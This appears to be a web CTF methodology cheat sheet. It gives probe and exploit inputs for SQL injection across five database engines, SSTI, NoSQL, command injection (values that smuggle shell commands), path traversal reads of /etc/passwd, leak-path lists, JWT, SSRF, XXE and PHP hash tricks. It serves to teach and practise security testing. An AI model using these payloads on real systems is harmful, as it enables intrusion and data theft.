item.title: 00 · First 10 Minutes
item.description:
First 10 Minutes

1. Read what the challenge gives you

If source is supplied, start there. Find routes, database setup, templates, upload handling, authentication checks, Dockerfile, and the flag placement. Trace input → transformation → guard → dangerous operation → response.

Sink in source Investigate
String concatenation / interpolation in SQL SQLi
render_template_string, Environment.from_string, template compilation SSTI
findOne(req.body), object spread into a database filter NoSQLi
exec, shell=True, system, backticks Command injection
open, readFile, include using user path LFI / traversal
Server HTTP client using user URL SSRF
Raw HTML / innerHTML / unescaped template output XSS
Object deserialization Deserialization
Recursive merge of untrusted JSON Prototype pollution

execute("... WHERE id=?", (id,)) is different from constructing the SQL string first. Parameterization protects values; dynamically assembled identifiers, sort directions, or a later query can remain vulnerable.

item.title: 01 · SQLi — Start Here
item.description:
SQL Injection — Start Here

Order: establish context → confirm true/false → identify engine → choose UNION or blind → enumerate schema → read the target row.

1. What does your input sit inside?

Possible original query Try as the input Why
WHERE id = INPUT 1 AND 1=1 / 1 AND 1=2 Numeric expression needs no quote
WHERE name = 'INPUT' apple' AND '1'='1 / apple' AND '1'='2 Preserve the original closing quote
WHERE name = 'INPUT' apple' AND 1=1-- - / apple' AND 1=2-- - Comment out the remaining query
WHERE name LIKE '%INPUT%' apple%' AND 1=1-- - / apple%' AND 1=2-- - Close the wildcard string
WHERE (name = 'INPUT') apple') AND 1=1-- - / apple') AND 1=2-- - Close the parenthesis too
ORDER BY INPUT 1, 2, 999 Identifier/expression position, not a quoted value

Choose apple / 1 to match an existing row. An AND test on a nonexistent row is false for both probes. If the query has extra predicates or nested parentheses, reconstruct that shape before copying a UNION payload.

item.title: 02 · SQLi — MySQL / MariaDB
item.description:
MySQL / MariaDB SQLi

Prerequisite: a confirmed injection, correct closure, column count, and reflected text slot. If not, start with SQLi.

The first payload below assumes a single-quoted input, three columns, and the second column displayed. Queries after it are fragments to adapt into that same UNION slot.

1. Confirm engine and current schema

missing' UNION SELECT NULL,CONCAT_WS(':',VERSION(),DATABASE(),CURRENT_USER()),NULL-- -

VERSION() distinguishes a MySQL/MariaDB build when its output is visible. DATABASE() can be NULL when no default schema is selected. CURRENT_USER() describes the account used for privilege checks; USER() describes the connection identity.

item.title: 03 · SQLi — PostgreSQL
item.description:
PostgreSQL SQLi

Flow: version() → database/schema → tables → columns → text-cast data. Start with SQLi if the insertion context is not yet confirmed.

1. Identify engine and context

Example input: three-column UNION, second column accepts text.

missing' UNION SELECT NULL,version(),NULL-- -
missing' UNION SELECT NULL,current_database()||':'||current_schema()||':'||current_user,NULL-- -

PostgreSQL is strict about UNION types. A text expression in an integer slot fails even if the injection itself works. Try each position with NULL elsewhere; cast retrieved values with ::text, but do not expect a cast to repair an incompatible original UNION column type.

item.title: 04 · SQLi — SQLite
item.description:
SQLite SQLi

Flow: sqlite_version() → sqlite_schema → CREATE TABLE SQL → actual columns → target rows.

SQLite is common in small Python/PHP CTF apps. Framework language alone is not proof of SQLite. First establish the injection context.

1. Identify engine

Three-column UNION with second column displayed:

missing' UNION SELECT NULL,sqlite_version(),NULL-- -

No DATABASE() / @@VERSION / information_schema in ordinary SQLite. Its schema catalog is sqlite_schema; the older name sqlite_master remains widely usable.

item.title: 05 · SQLi — SQL Server
item.description:
Microsoft SQL Server SQLi

Flow: confirm T-SQL → identify database/schema → read sys catalogs → extract rows. First establish the insertion context.

1. Fingerprint

Three-column UNION, second column text-compatible:

missing' UNION SELECT NULL,@@VERSION,NULL-- -
missing' UNION SELECT NULL,DB_NAME()+':'+SYSTEM_USER,NULL-- -

@@VERSION also exists in MySQL; inspect the actual returned product string. Errors mentioning Unclosed quotation mark, SQL Server, or Conversion failed support the fingerprint but are not all unique.

Useful fragments:

SELECT DB_NAME(),SCHEMA_NAME(),SYSTEM_USER,USER_NAME();
SELECT name FROM sys.databases;

Metadata visibility follows permissions. A database list can be incomplete.

item.title: 06 · SQLi — Oracle
item.description:
Oracle SQLi

Flow: Oracle error / function → UNION with dual → current-user tables → column types → data.

Start with the general SQLi workflow. Oracle-specific syntax is useful only after matching the original quote/parenthesis context.

1. Fingerprint and count columns

Traditional Oracle SELECT probes use dual. This remains useful across versions even where newer releases permit some SELECTs without it.

missing' UNION SELECT NULL FROM dual-- -
missing' UNION SELECT NULL,NULL FROM dual-- -
missing' UNION SELECT NULL,NULL,NULL FROM dual-- -

Find a text-compatible reflected position, then:

item.title: 07 · SQLi — Blind / Error
item.description:
Blind and Error-Based SQLi

Blind SQLi means no direct data output. You still need a reliable oracle. A change in row visibility, message, HTTP status, exception, or response time can answer one yes/no question per probe.

1. Establish the oracle before extracting

Choose a known existing ID and preserve the original request/session:

1 AND 1=1
1 AND 1=2

For a quoted value:

apple' AND 1=1-- -
apple' AND 1=2-- -

Repeat baseline → true → false → true. Define the exact observable result:

item.title: 08 · Source / Backup Leaks
item.description:
Source, Backup, and Debug Leaks

Start here before injection. A leaked route, schema, secret, or source map can turn guessing into a direct source audit.

1. Compare against a nonexistent path

Request a deliberately nonexistent path first. Some applications return the same SPA shell or login page for everything. A 200 alone does not establish that a backup exists.

Check challenge-indicated names and linked resources:

/robots.txt
/sitemap.xml
/.well-known/security.txt
/app.js
/app.js.map
/static/js/main.js.map
/.git/HEAD
/.git/config
/index.php.bak
/index.php~
/.index.php.swp
/backup.zip
/source

Do not assume every listed path is present. Follow actual asset names, comments, source map annotations, and error paths rather than trying arbitrary filenames indefinitely.

item.title: SSTI · Identify the Engine First
item.description:
Server-side template injection

Order: raw-response evaluation → engine-specific syntax → context objects → file/data access → command execution only if needed. A reflected 49 identifies expression evaluation, not a particular engine and not command execution.

1. First requests

Find greetings, custom email templates, PDF previews, error messages, product descriptions and editable themes. Save the normal response before sending one probe at a time.

Raw input Control Interpretation
AA{{7*7}}ZZ AA{{7*8}}ZZ AA49ZZ / AA56ZZ: expression evaluation in this delimiter family
AA${7*7}ZZ AA${7*8}ZZ FreeMarker, EL or another ${} engine; investigate
AA<%= 7*7 %>ZZ AA<%= 7*8 %>ZZ ERB/EJS family; distinguish Ruby from JavaScript
AA#{7*7}ZZ AA#{7*8}ZZ Some Ruby/Pug/EL contexts; only meaningful with supporting syntax
AA{7*7}ZZ AA{7*8}ZZ Smarty-like arithmetic possible

Inspect raw HTTP, then browser DOM. Evaluation only after JavaScript executes may be client-side template injection. A static 49 elsewhere is irrelevant. Literal payload may mean data is passed safely to a fixed template, wrong delimiter, wrong render stage, or escaping before compilation.

item.title: NoSQL Injection · Operators & Blind Reads
item.description:
NoSQL injection

First decide which parser you control: JSON query operators or a string inserted into JavaScript. $ne is not SQL syntax; ' || true is not a valid JSON operator object.

1. Establish a baseline

Record status, redirect destination, body marker, session cookie and the resulting /me identity. A redirect or new cookie can represent a failed/anonymous session.

POST /login HTTP/1.1
Host: ctf.invalid
Content-Type: application/json

{"username":"admin","password":"definitely-wrong"}

Try one changed field at a time. If the server uses findOne({username: body.username, password: body.password}), an object may be treated as a predicate. If it coerces to a string or hashes a string password first, operator objects usually do not help.

item.title: XSS · Context Before Payload
item.description:
Cross-site scripting

Order: marker → locate exact output context → harmless execution proof → bot/admin workflow → read the challenge data. Reflection in JSON or escaped HTML alone is not XSS.

1. Map source and sink

Submit a unique marker such as CTF_MARK_731. Search raw HTML, response headers, JS bundles and the live DOM. For stored input, revisit list/detail/moderation/export views. For DOM input, inspect location.search, location.hash, postMessage, storage and JSON fetch responses.

item.title: Auth & IDOR · Compare Two Accounts
item.description:
Authentication, authorization and IDOR

Use two accounts and known object IDs. The strongest first test is whether account B can read one private object created by account A. Guessing lots of IDs is less informative.

1. Build a small ownership matrix

Request Expected
A token → A private object Allowed
B token → B private object Allowed
B token → A private object Denied
No token → A private object Denied

Keep cookies separate in browser profiles or Repeater tabs. Verify identity at /me before each comparison. Public profiles are not automatically IDOR; test data intended to be private.

item.title: JWT · Claims, Algorithms & Keys
item.description:
JWT attacks

Decode → identify consumer → test signature enforcement → inspect key selection → check claims. Base64url decoding reveals data; it does not recover the signing key.

1. Recognize the format

A common signed compact token has three dot-separated parts:

BASE64URL(header).BASE64URL(payload).BASE64URL(signature)

A five-part token may be encrypted JWE; do not apply three-part JWS edits blindly. Opaque random session strings are a different format.

Example decoded data:

{"alg":"HS256","typ":"JWT"}
{"sub":"12","role":"user","iss":"ctf-app","aud":"web","exp":1900000000}

Use an available offline Base64url/JWT inspector. Ordinary base64 uses +/ while base64url uses -_; padding is commonly omitted. JSON formatting changes signed bytes. Do not upload live challenge tokens to public decoding websites.

item.title: OAuth / Account Linking
item.description:
OAuth and Account Linking

Map who issues each value and which browser/session it belongs to. A code, access token, ID token, email claim, and application session cookie are different credentials.

1. Record the whole normal flow

Browser → client /login
Client → provider /authorize
Provider → client callback?code=...&state=...
Client server → provider token endpoint
Client → authenticated application session

Typical authorization request:

GET /authorize?response_type=code&client_id=client123&redirect_uri=https%3A%2F%2Fctf.invalid%2Fcallback&scope=openid%20profile&state=RANDOM_STATE&code_challenge=PKCE_CHALLENGE&code_challenge_method=S256 HTTP/1.1
Host: provider.ctf.invalid

Capture the actual URL. Note state, nonce for OpenID Connect, and PKCE challenge/verifier if present. Never infer which controls are enforced just because a parameter appears.

item.title: Prototype Pollution · Source to Gadget
item.description:
JavaScript prototype pollution

Pollution source → inherited property proof → reachable gadget → visible effect. An object containing a key named __proto__ is not by itself proof that any prototype changed.

1. Where to look

Inspect recursive merge, config update, query-string-to-object, dot/bracket path setters and JSON import features. Look in client bundles for merge, defaultsDeep, set, parse, Object.assign and recursive property copying. Inspect dependency versions when source is provided.

Vulnerable shape to recognize:

item.title: GraphQL · Schema to Resolver
item.description:
GraphQL manual testing

Endpoint → valid operation → schema → exact fields/arguments → resolver authorization. Introspection reveals structure; it does not by itself grant access.

1. Find and confirm

Look in frontend network requests before trying common /graphql, /api/graphql, /gql paths. A GraphiQL/Apollo UI may show history or schema documentation.

POST /graphql HTTP/1.1
Host: ctf.invalid
Content-Type: application/json

{"query":"query { __typename }"}

Expected example: {"data":{"__typename":"Query"}}. A 200 OK response may still contain an errors array. GraphQL field errors can coexist with partial data.

item.title: CSRF & CORS · Send vs Read
item.description:
CSRF and CORS

CSRF asks whether another site can cause an authenticated action. CORS asks whether that site’s JavaScript can read the response. Demonstrate them in an actual browser; Repeater does not enforce browser security rules.

1. Record the prerequisites

State-changing route and method:
Content type:
Authentication: automatic cookie, HTTP auth, or explicit bearer header?
CSRF token: where generated, where checked, bound to which session?
Cookie SameSite / Secure / domain / path:
Origin / Referer checks:
Actual browser result:

Bearer tokens added by the normal frontend from its own storage are not automatically added by an attacker origin. Cookies may be, subject to SameSite and third-party cookie policy.

item.title: WebSockets / Live Sessions
item.description:
WebSockets and Live Sessions

A successful upgrade is only the start. Preserve message order, session state, sequence IDs, and asynchronous responses through the challenge’s final result.

1. Capture the actual protocol

Browser DevTools → Network → WS → Messages, or Burp’s WebSocket history.

GET /socket HTTP/1.1
Host: ctf.invalid
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://ctf.invalid
Cookie: session=YOUR_SESSION

That key is the RFC example. A real client generates a fresh key and handles the handshake. Do not send an arbitrary HTTP body after upgrading and assume it is a valid WebSocket frame. Browser/client libraries mask client frames, handle fragmentation, and respond to control frames.

item.title: Command Injection
item.description:
Command injection

First find whether input reaches a shell, an executable argument, or only application logic. Ping, traceroute, DNS, archive, image conversion, PDF and Git wrappers are common sinks.

1. First test → control → interpretation

Start from a working request and preserve its other fields.

Probe value Control Meaning if repeatable
127.0.0.1;printf CTF_A71 127.0.0.1;printf CTF_B82 Changed output marker suggests a POSIX shell
127.0.0.1;sleep 3 127.0.0.1;sleep 0 Repeatable added delay suggests execution; compare several pairs
127.0.0.1&&printf CTF_A71 Valid normal host RHS needs the original command to succeed
`invalid-host printf CTF_A71`
127.0.0.1&echo CTF_A71 Change marker Candidate Windows cmd.exe; & also has different POSIX semantics

An echoed payload is not execution. The marker must be produced by the command, or its timing must track the requested delay. Do not diagnose injection from a slow DNS lookup alone.

item.title: Traversal & LFI
item.description:
Path traversal and local file inclusion

Prove a file read before trying code execution. A download function may only read bytes; a PHP include also interprets PHP code. Those are different capabilities.

1. First probes

Candidate parameters: file, filename, path, page, template, lang, image/download IDs that contain paths.

Raw value Control Evidence
../../../../etc/passwd Same traversal to etc/ctf-does-not-exist Recognizable account file vs missing-file response
/etc/passwd /etc/ctf-does-not-exist Absolute path accepted by the file operation
..\..\..\Windows\win.ini Missing .ini path Windows path traversal, if its contents return
../../../../proc/self/cmdline Missing proc path Linux process arguments, possibly NUL-separated

Start with one ../, then add depth while retaining the filename. A 200 OK page containing a fixed error is a negative result. Match real file contents and compare a nonexistent path.

item.title: SSRF
item.description:
Server-side request forgery

Establish that the server fetches a URL, then identify the URL parser, protocol and network location. Typical sinks: previews, webhook testers, imports, stock checks, image/PDF renderers.

1. First probe and control

Give the endpoint a unique path on a challenge-provided callback service:

http://YOUR-LAB-HOST/ssrf-marker-71

Then compare an ordinary valid fetch and an intentionally missing path. Inspect request method, headers, source and callback timing. A browser loading your image is not a server fetch; submit the same request in Repeater without rendering the page.

item.title: XXE & XML Parsers
item.description:
XML external entity injection

Prove XML processing, then entity expansion, then external resource access. Each step establishes a different capability.

1. Establish the parsing surface

Look for XML API bodies, SOAP, SVG, document imports and server-side XML conversions. Keep the application’s real root and field names; changing the entire document may fail schema validation before reaching the interesting parser.

<?xml version="1.0"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

Use the original accepted Content-Type, normally application/xml or text/xml. A JSON route may reject XML completely. Conversion support must be demonstrated, not assumed.

item.title: File Upload
item.description:
File upload

Track four stages separately: accepted → stored → reachable → interpreted. An upload success message proves only the first stage.

1. Establish the normal path

Upload an allowed small file with a unique marker. Save the multipart request, response URL, final stored filename and retrieval response headers. Compare the retrieved bytes with the original: resizing/re-encoding can remove appended content and metadata.

POST /upload HTTP/1.1
Host: ctf.invalid
Content-Type: multipart/form-data; boundary=ctf71

--ctf71
Content-Disposition: form-data; name="file"; filename="marker.txt"
Content-Type: text/plain

CTF_UPLOAD_71
--ctf71--

Keep other required fields, cookies and CSRF tokens from the captured request. Let Repeater update Content-Length. Multipart delimiters use the exact declared boundary with two leading dashes; the last delimiter has two trailing dashes.

item.title: Deserialization
item.description:
Insecure deserialization

Identify the format and actual decoder before changing bytes. Base64 is an encoding, not a serializer; an unsigned JSON cookie may be plain data tampering rather than object injection.

1. Find and unwrap the input

Look at cookies, saved preferences, cart/import blobs, queue messages and backup uploads. Save the original bytes before editing.

Transport decoding → Base64/hex if present → compression if present → serialization

Decode only layers supported by evidence. Re-encode in reverse order after a single small change. A signature/MAC must still validate; knowing its encoding does not let you forge it.

item.title: Business Logic & Races
item.description:
Business logic and race conditions

Write the invariant first: “one account may redeem this code once,” “the charged amount equals the server’s product price,” or “a completed order cannot change owner.” Then build the smallest request sequence that violates it.

1. Map the intended workflow

Register → verify identity → add item → apply coupon → pay → confirm → download

Capture every request and object ID. Note which endpoint changes state, which values come from the client and which checks depend on previous steps. A disabled button is not a server check.

item.title: HTTP, Cache & Smuggling
item.description:
HTTP parsing, cache issues and request smuggling

Map the components: browser → CDN/cache → reverse proxy → application. Ask what each considers the host, path, cache key and end of the request.

1. Establish a baseline

Capture the exact HTTP version, route and response headers. Repeat the request to see whether a cache is present.

GET /?probe=cache71 HTTP/1.1
Host: ctf.invalid

Inspect Age, Via, X-Cache, cache-status headers, Cache-Control and Vary. A missing cache header does not establish absence of caching; a header saying HIT is still weaker evidence than a controlled stored response difference.

item.title: PHP · Types / Hashes / Parsers
item.description:
PHP Quirks

Read the comparison, PHP version, and input parser before choosing a trick. Many classic PHP CTF payloads changed behavior in PHP 8.

1. Loose comparison and magic hashes

Vulnerable source pattern:

if (md5($input) == $stored_hash) { /* challenge gate */ }

Two known MD5 inputs:

240610708  → 0e462097431906509019562988736854
QNKCDZO    → 0e830400451993494058024219903391

Both digests look like numeric scientific notation for zero. Comparing those digest strings using == can treat them as equal even on modern PHP. === compares string identity and prevents this particular bypass.

item.title: LDAP / XPath Injection
item.description:
LDAP and XPath Injection

These query languages do not share SQL grammar. Quotes, comments, schema discovery, and wildcard meaning depend on the actual parser.

LDAP: identify a filter string

Possible source:

(uid=INPUT)
(&(uid=USERINPUT)(userPassword=PASSINPUT))

Useful first probes for a search filter:

alice
*
alice*
(
)
\
Result Interpretation
* returns many entries Wildcard accepted, possibly intended search behavior
Unbalanced ( or ) gives filter syntax error Potential filter-string construction
Structured filter injection changes logic Stronger evidence of LDAP injection

For source exactly constructing (&(uid=INPUT)(department=public)), this input:

item.title: Open Redirect / URL Parsing
item.description:
Open Redirect and URL Parsing

Look for next, return, redirect, url, continue, callback, or client-side navigation reading a URL parameter.

1. Establish the navigation sink

GET /login?next=%2Fprofile HTTP/1.1
Host: ctf.invalid

Determine whether navigation is:

  • An HTTP Location header on a 3xx response.
  • An HTML <meta http-equiv="refresh">.
  • A JavaScript assignment such as location = input.
  • A link that only navigates when clicked.

Reflection in an anchor or message is not automatic redirection. Inspect the actual destination in the browser as well as the response headers.

item.title: Encoding & Filter Bypasses
item.description:
Encoding, filters and parser differences

Write down the bytes at each layer. Most failed payloads come from the wrong context, a changed transport encoding, or a bypass aimed at a parser the input never reaches.

Your editor → HTTP transport → URL/form/JSON decoder → validation
→ framework parsing → query/template/shell/path parser → output encoding

Move validation in that diagram if source shows a different order. The same %27 can be a quote, literal text, or a blocked token depending on the point inspected.

item.title: Python · Reusable Web Helpers
item.description:
Reusable Python for Web CTFs

Prepared snippets for offline notes. The two downloads use the Python standard library. They do not need AI, an API key, or package installation. Use the event-permitted runtime and follow the event’s rules on saved code.

Download Purpose Network access
web_helpers.py Hex, Base64, URL, XOR, hashes, JWT inspection / known-key HS256 signing None
sqli_boolean.py Extract one scalar using an already-proven boolean GET oracle Only the endpoint you supply

1. Exact bytes in and out

python web_helpers.py hex-decode --text 666c61677b64656d6f7d --output decoded.bin
python web_helpers.py b64-decode --text 'ZmxhZ3tkZW1vfQ==' --output decoded.bin
python web_helpers.py url-encode --text "' UNION SELECT NULL-- -"
python web_helpers.py xor --file cipher.bin --key-hex 494345 --output plain.bin
python web_helpers.py hashes --file sample.bin

The helper does not add a newline to binary output. --text means UTF-8 text, --file means actual bytes, and --key-hex 494345 means the three bytes ICE, not the six ASCII characters 494345.
